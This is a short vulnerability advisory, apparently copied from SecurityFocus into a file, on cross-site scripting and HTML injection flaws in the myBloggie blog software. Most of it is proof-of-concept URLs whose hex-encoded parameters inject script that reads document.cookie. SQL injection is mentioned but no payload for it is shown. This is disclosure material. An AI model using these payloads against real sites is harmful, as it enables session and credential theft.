@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/13507/info
+
+myBloggie is affected by multiple vulnerabilities.
+
+An attacker may leverage these issues to carry out cross-site scripting, HTML injection and SQL injection attacks against the affected application. This may result in the theft of authentication credentials, destruction or disclosure of sensitive data, and potentially other attacks. The integrity of a site may be compromised by deleting arbitrary comments as well. 
+
+Cross-site scripting:
+http://www.example.com/mybloggie/index.php?month_no=3&year=%3Cscript%3Ealert
+(document.cookies)%3C/script%3E
+
+HTML injection:
+http://www.example.com/mybloggie/index.php?mode=viewcat&cat_id=%3C%73%63%72%
+69%70%74%3E%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2
+9%3C%2F%73%63%72%69%70%74%3EC
+
+http://www.example.com/mybloggie/index.php?mode=viewmonth&month_no=%3C%73%63
+%72%69%70%74%3E%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%
+65%29%3C%2F%73%63%72%69%70%74%3E
+
+http://www.example.com/mybloggie/index.php?mode=viewid&post_id=%3C%73%63%72%
+69%70%74%3E%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2
+9%3C%2F%73%63%72%69%70%74%3E
